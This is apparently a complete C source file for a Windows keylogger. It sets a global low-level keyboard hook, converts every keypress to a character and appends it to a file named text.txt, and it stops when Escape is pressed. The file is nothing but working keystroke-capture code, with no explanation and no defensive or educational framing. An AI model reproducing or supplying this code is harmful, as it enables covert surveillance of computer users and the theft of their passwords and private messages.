#include <windows.h>
#include <tchar.h>


static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		KBDLLHOOKSTRUCT * strct = (KBDLLHOOKSTRUCT *)lParam;
		DWORD wVirtKey = strct->vkCode, wScanCode = strct->scanCode, dwTemp;
		UINT ShiftKey = 16, Capital = 20;

		if (wVirtKey == VK_ESCAPE) PostQuitMessage(0);
		BYTE lpKeyState[256];
		GetKeyboardState(lpKeyState);
		lpKeyState[ShiftKey] = 0;
		lpKeyState[Capital] = 0;
		if (GetKeyState(VK_LSHIFT) < 0 || GetKeyState(VK_RSHIFT) < 0) 
		{
			lpKeyState[ShiftKey] = 0x80;
		}
		if ((GetKeyState(VK_CAPITAL) & 1) == 1) 
		{
			lpKeyState[Capital] = 0x01;
		}

		WCHAR result;
		ToUnicode(wVirtKey, wScanCode, lpKeyState, (LPWSTR)&result, 1, 2);

		HANDLE hFile = CreateFile(TEXT("text.txt"), FILE_APPEND_DATA, FILE_SHARE_WRITE,
			0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (INVALID_HANDLE_VALUE == hFile) 
		{
			return NULL;
		}
		WriteFile(hFile, &result, sizeof(result), &dwTemp, NULL);
		CloseHandle(hFile);
		
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

int main()
{
	HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	if (hHook == NULL) return 0;
	MSG msg;
	GetMessage(&msg, NULL, 0, 0);
	UnhookWindowsHookEx(hHook);
	return 0;
}
